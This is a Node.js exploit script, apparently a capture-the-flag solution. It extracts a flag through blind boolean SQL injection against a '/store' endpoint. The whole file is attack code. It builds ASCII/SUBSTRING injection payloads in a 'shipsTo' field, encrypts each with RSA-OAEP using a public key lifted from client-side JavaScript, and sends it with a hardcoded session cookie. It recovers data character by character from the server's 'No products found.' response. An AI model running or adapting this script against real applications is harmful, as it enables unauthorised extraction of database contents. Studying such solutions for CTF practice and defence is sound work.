const axios = require('axios');
const crypto = require('crypto');

const challengeHost = '';
const target = `http://${challengeHost}/store`;
const sessionCookie = 'session=eyJsb2dnZWRpbiI6dHJ1ZSwidXNlcm5hbWUiOiJ4eHgifQ.Z_iP0Q.hJc89DKcVw0EUOdoodMPmD-gfyU';
const charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!?@_{}~';
let result = '';

// gained from analyzing client-side javascript code.
const publicKey = `
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA6PUik0+DjNI2/fPXerby
zK9kkKu5SSrVmtcNClvYqwvoYIjeDqPeazK/q+SwXeHLTUwesIu7UHmkzOb1evB9
Tr0MPCXbHSameRKuxtYAQK/beBEluIrVnyRH14IIlyuxjJxKxef5tMM6yefxkAey
takqpusaRqpIZSpP0jzzHQFUyKRXPDIljXFe55br+rCcXG96x/x+PJ3OfdUWn4zq
xQXIGOK28arQKREUinE07saSztLMOhvTmaFyP+rLlhXNVNoLENIq4d8lqyrJPPsW
ixVZ8RSN2sCzchz074nIOemMkVOgzobQ+h2pvq62jpxgDd0XJE4RDwKRmgFPDdHv
aQIDAQAB
-----END PUBLIC KEY-----
`;

function toHex(char) { return '0x' + Buffer.from(char).toString('hex'); }

async function extractFlag() {
  for (let i = 1; i <= 40; i++) {
    for (let ch of charset) {
      const hexChar = toHex(ch);
      const payload = `1 AND ASCII(SUBSTRING((SELECT flag from flag) FROM ${i} FOR 1))=ASCII(${hexChar})-- -`;

      const preEncodedPostData = {
        hash: 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"x',
        shipsTo: payload
      };
      const bufferData = Buffer.from(JSON.stringify(preEncodedPostData));
      const encrypted = crypto.publicEncrypt(
        {
          key: publicKey,
          padding: crypto.constants.RSA_PKCS1_OAEP_PADDING,
          oaepHash: 'sha256',
        },
        bufferData
      );

      const encryptedBase64 = encrypted.toString('base64');
      const encryptedBase64PostData = JSON.stringify({data:encryptedBase64});
    
      try {
        const res = await axios.post(target, encryptedBase64PostData, {
          headers: {
            'Content-Type': 'application/json',
            'Cookie': sessionCookie
          }
        });

        if (!res.data.includes('No products found.')) {
          result += ch;
          console.log(`Found character: ${ch}`);
          break;
        }
      } catch (err) {
        console.error(`Request failed: ${err.message}`);
      }
    }
  }

  console.log('Flag:', result);
}

extractFlag();